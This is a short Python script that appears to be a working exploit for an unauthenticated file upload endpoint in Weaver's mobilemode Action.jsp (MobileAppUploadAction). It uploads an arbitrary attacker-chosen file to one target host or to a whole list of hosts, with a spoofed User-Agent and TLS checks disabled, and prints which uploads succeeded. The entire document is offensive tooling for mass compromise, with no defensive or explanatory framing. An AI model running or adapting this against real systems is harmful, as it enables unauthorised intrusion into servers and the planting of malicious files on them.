import argparse
import requests

def upload_file(host, file_path, file_content):
    url = f"{host}/mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.ui.servlet.MobileAppUploadAction&action=image"

    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "close",
    }

    files = {
        "upload": (file_path, file_content, "text/plain"),
    }

    proxy = {"http": "127.0.0.1:8088", "https": "127.0.0.1:8088"}

    response = requests.post(url, headers=headers,files=files, proxies=proxy, timeout=5, verify=False)
    return response

def main():
    parser = argparse.ArgumentParser(description="Upload file to host(s)")
    parser.add_argument("-u", "--host", help="Single host to upload the file")
    parser.add_argument("-l", "--list", help="File containing list of hosts")
    parser.add_argument("-f", "--file", required=True, help="File to upload")
    args = parser.parse_args()

    file_path = args.file
    with open(file_path, 'r') as f:
        file_content = f.read()

    def process_response(response, host):
        if "success" in response.text:
            print(f"Upload to {host} succeeded.")
        else:
            print(f"Upload to {host} failed.")

    if args.host:
        print(f"Uploading to {args.host}...")
        response = upload_file(args.host, file_path, file_content)
        process_response(response, args.host)

    if args.list:
        with open(args.list, 'r') as f:
            hosts = f.readlines()
        for host in hosts:
            host = host.strip()
            if host:
                print(f"Uploading to {host}...")
                response = upload_file(host, file_path, file_content)
                process_response(response, host)

if __name__ == "__main__":
    main()
